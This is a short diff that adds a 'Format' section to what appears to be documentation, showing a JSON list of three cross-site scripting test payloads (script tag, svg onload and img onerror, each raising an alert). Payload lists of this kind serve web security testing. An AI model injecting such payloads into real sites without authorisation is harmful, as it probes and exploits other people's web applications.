@@ -1,1 +1,9 @@
 
+## Format
+```json
+[
+    "<script>alert('XSS')</script>",
+    "\"><svg/onload=alert('XSS')>",
+    "<img src=x onerror=alert('XSS')>"
+]
+
